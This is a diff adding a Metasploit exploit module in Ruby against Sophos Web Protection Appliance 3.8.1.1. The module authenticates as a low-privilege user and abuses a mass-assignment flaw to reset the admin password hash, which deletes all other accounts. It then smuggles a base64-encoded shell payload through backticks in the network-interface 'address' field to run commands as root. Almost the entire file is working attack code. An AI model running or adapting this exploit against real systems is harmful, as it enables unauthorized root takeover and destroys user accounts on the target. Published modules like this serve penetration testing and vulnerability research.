@@ -1,0 +1,200 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution',
+      'Description'    => %q{
+        This module takes advantage of two vulnerabilities in order to gain remote code execution as root
+        as an otherwise non-privileged authorized user. By taking advantage of a mass assignment
+        vulnerability that allows an unprivileged authenticated user to change the admininistrator's
+        password hash, the module updates the password to login as the admin to reach the second vulnerability.
+        No server-side sanitization is done on values passed when configuring a static network interface.
+        This allows an administrator user to run arbitrary commands in the context of the web application,
+        which is root when configuring the network interface. This module will inadvertently delete
+        any other users that may have been present as a side effect of changing the admin's password.
+      },
+      'Author'         =>
+        [
+          'Brandon Perry <bperry.volatile@gmail.com>' # discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-069/']
+        ],
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'Space'       => 500,
+          'DisableNops' => true,
+          'BadChars'    => "", #base64 encryption ftw!
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' =>  'generic telnet'
+            }
+        },
+      'Targets'        =>
+        [
+          [ 'Sophos Web Protection Appliance 3.8.1.1', { }]
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL' => true
+        },
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Apr 8 2014'
+      ))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
+        OptString.new('PASSWORD', [true, 'The password to authenticate with', nil]),
+        OptString.new('TARGETURI', [true, 'The target URI', '/']),
+        Opt::RPORT(443)
+      ],
+      self.class
+    )
+  end
+
+  def exploit
+      init = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php')
+      })
+
+      if !init or !init.body
+        fail_with("Could not connect to host")
+      end
+
+      print_status("Getting STYLE key...")
+
+      style = ''
+      init.body.each_line do |line|
+        next if line !~ /name="STYLE" value="(.*)"/
+        style = $1
+      end
+
+      if style == ''
+        fail_with("Could not find style key.")
+      end
+
+      post = {
+       'STYLE' => style,
+       'destination' => '',
+       'section' => '',
+       'username' => datastore['USERNAME'],
+       'password' => datastore['PASSWORD']
+      }
+
+      print_status("Authenticating as " + datastore['USERNAME'])
+      login = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, '/index.php?c=login'),
+        'method' => 'POST',
+        'vars_post' => post
+      })
+
+      if !login or login.code != 200 or login.body !~ /#{datastore['USERNAME']}<\/a>/
+        fail_with("Authentication failed")
+      end
+
+      #I don't know what salt is being used to hash these
+      #passwords (probably in js somewhere), so I have
+      #to use a static one that I saw being POSTed while
+      #exploring, it is 'notpassword'.
+      #
+      #This will actually delete every other user that exists
+      #except for admin, whose password will be changed
+      #
+      #whoops
+      admin_hash = '[{"id": "default_admin", "username": "admin", "name": "Default Administrator"'
+      admin_hash << ', "password": "70ec23d3e019a307081732c0162b2733", "description": "Default '
+      admin_hash << 'Administrator Account", "admin": true, "roles": ["admin"], "reporting_groups"'
+      admin_hash << ': [], "user_id": 0}]'
+
+      post = {
+        'action' => 'save',
+        'STYLE' => style,
+        'username' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['USERNAME'])),
+        'current' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['PASSWORD'])),
+        'new' => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore['PASSWORD'])),
+        'admins' => admin_hash
+      }
+
+      print_status("Changing old password hash to notpassword")
+      passchange = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, '/index.php?c=change_password'),
+        'method' => 'POST',
+        'vars_post' => post
+      })
+
+      if !passchange or passchange.code != 200
+        fail_with("Couldn't update admin's password")
+      end
+
+      print_status("Logging in as the admin now")
+      init = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php')
+      })
+
+      if !init or init.code != 200
+        fail_with("Couldn't reget index page for admin auth")
+      end
+
+      init.body.each_line do |line|
+        next if line !~ /name="STYLE" value="(.*)"/
+        style = $1
+      end
+
+      post = {
+        'STYLE' => style,
+        'destination' => '',
+        'section' => '',
+        'username' => 'admin',
+        'password' => 'notpassword'
+      }
+
+      login = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php?c=login'),
+        'method' =>  'POST',
+        'vars_post' => post
+      })
+
+      if !login or login.code != 200 or login.body !~ /admin<\/a>/
+        fail_with("Couldn't login as admin")
+      end
+
+      pay = Rex::Text.uri_encode(Rex::Text.encode_base64(payload.encoded))
+      post = {
+        'STYLE' => style,
+        'dhcp' => 'no',
+        'address' => "192.16`echo #{pay}|base64 --decode|sh`8.1.16",
+        'gateway' => '192.168.1.254',
+        'sb_bridge' => 'explicit',
+        'netmask' => '255.255.255.0',
+        'sb_linktype' => 'auto',
+        'dns' => 'yes',
+        'dns1' => '192.168.1.254',
+        'dns2' => '',
+        'dns3' => ''
+      }
+
+      print_status("Sending payload")
+      send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php?c=netinterface'),
+        'method' => 'POST',
+        'vars_post' => post,
+      })
+  end
+end
